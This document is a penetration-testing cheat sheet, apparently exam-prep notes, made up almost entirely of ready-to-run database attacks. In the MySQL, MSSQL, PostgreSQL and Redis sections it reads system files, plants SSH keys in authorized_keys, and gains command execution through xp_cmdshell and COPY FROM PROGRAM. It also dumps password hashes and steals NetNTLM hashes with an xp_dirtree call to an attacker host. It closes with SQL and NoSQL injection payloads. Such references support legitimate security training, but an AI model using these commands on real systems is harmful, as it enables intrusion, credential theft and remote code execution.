# Databases and SQL injection

[Practice methodology](../Practice-Exam-Methodology.md) · [Reference index](00-Reference-Index.md)

Commands preserved from the original reference. Replace angle-bracket placeholders before running; check your installed tool’s help for version-specific options.


## MySQL

```bash
mysql -u root -p                     # connect to local MySQL as root
mysql -u <USERNAME> -h <RHOST> -p    # connect to remote MySQL
```

```sql
SHOW databases;
USE <DATABASE>;
SHOW tables;
SELECT * FROM users \G;
SELECT LOAD_FILE('/etc/passwd');
SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' LINES TERMINATED BY '\n';
\! /bin/sh                          -- drop shell
```

## MSSQL

```bash
impacket-mssqlclient <USERNAME>@<RHOST>                  # connect to MSSQL with Impacket
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth    # connect to MSSQL with Windows auth
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'          # connect to MSSQL with sqlcmd
```

```sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;

-- xp_cmdshell
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Steal NetNTLM
exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'

-- List files
EXEC master.sys.xp_dirtree N'C:\inetpub\wwwroot\',1,1;
```

## PostgreSQL

```bash
psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>    # connect to PostgreSQL database
```

```sql
\list           -- list databases
\c <DATABASE>   -- use database
\dt             -- list tables
\du             -- list users
SELECT usename, passwd from pg_shadow;

-- RCE
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

## MongoDB

```bash
mongo "mongodb://localhost:27017"    # connect to local MongoDB
```

```
use <DATABASE>;
show collections;
db.users.find();
db.getUsers({showCredentials: true});
db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

## Redis

```bash
redis-cli -h <RHOST>                 # connect to Redis
AUTH <PASSWORD>                      # authenticate to Redis
CONFIG GET *                         # dump Redis configuration
KEYS *                               # list Redis keys
GET PHPREDIS_SESSION:<SESSION_ID>    # read PHP session value

# Write SSH key
echo "FLUSHALL" | redis-cli -h <RHOST>                                    # clear Redis keys before writing payload key
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt    # wrap SSH public key with newlines
cat /tmp/key.txt | redis-cli -h <RHOST> -x set s-key                      # store SSH public key in Redis
redis-cli -h <RHOST>                                                      # reconnect to Redis for config writes
> CONFIG SET dir /var/lib/redis/.ssh                                      # set Redis write directory to SSH folder
> CONFIG SET dbfilename authorized_keys                                   # write database as authorized_keys
> save                                                                    # force Redis to write file
```

## sqlite3

```bash
sqlite3 <FILE>.db              # open SQLite database
.tables                        # list SQLite tables
PRAGMA table_info(<TABLE>);    # show SQLite table schema
SELECT * FROM <TABLE>;         # dump SQLite table rows
```

## SQL Injection

### Authentication Bypass
```sql
admin' or '1'='1
' or 1=1 limit 1 -- -+
'-'
' or true--
admin' --
```

### MySQL Union-based
```sql
' ORDER BY 1-- //
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //
-1 union select 1,2,version();#
-1 union select 1,2,database();#
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

### Blind SQLi
```sql
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

### NoSQL Injection
```
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null}}
```
